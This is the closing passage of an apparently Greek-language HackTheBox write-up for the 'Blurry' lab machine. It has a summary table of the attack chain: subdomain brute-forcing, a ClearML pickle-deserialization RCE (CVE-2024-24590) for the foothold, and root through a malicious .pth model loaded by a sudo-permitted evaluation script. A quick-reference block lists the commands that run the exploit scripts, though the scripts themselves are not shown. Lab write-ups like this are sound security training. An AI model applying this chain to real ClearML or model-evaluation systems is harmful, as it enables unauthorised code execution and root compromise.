+    <tr><th>Σταδιο</th><th>Τεχνικη</th><th>Εργαλειο</th></tr>
+    <tr><td>Recon</td><td>Brute-force subdomains &#8594; 3 vhosts</td><td>gobuster</td></tr>
+    <tr><td>Enum</td><td>Rocket.Chat &#8594; admin = jippity</td><td>browser</td></tr>
+    <tr><td>Foothold</td><td>CVE-2024-24590 ClearML pickle deserialization RCE</td><td>python3, nc</td></tr>
+    <tr><td>PrivEsc</td><td>sudo evaluate_model + κακόβουλο .pth &#8594; torch.load() RCE σαν root</td><td>python3, nc</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">quick reference</span></div>
+    <div class="term-body"><span class="pco"># Ανακαλυψη subdomains</span>
+<span class="pc">gobuster dns -d "blurry.htb" -w subdomains-top1million-5000.txt</span>
+
+<span class="pco"># Setup SDK ClearML</span>
+<span class="pc">pip install clearml &amp;&amp; clearml-init</span>
+
+<span class="pco"># Τρεξε exploit pickle</span>
+<span class="pc">python3 exploit.py</span>
+
+<span class="pco"># Χτίσε κακόβουλο μοντέλο</span>
+<span class="pc">python3 malicious_model.py</span>
+
+<span class="pco"># Πυροδοτησε privesc</span>
+<span class="pc">sudo /usr/bin/evaluate_model /models/sp1r4_model.pth</span></div>
+  </div>
+
+</div>
+
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>&#169; 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">&#8592; Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
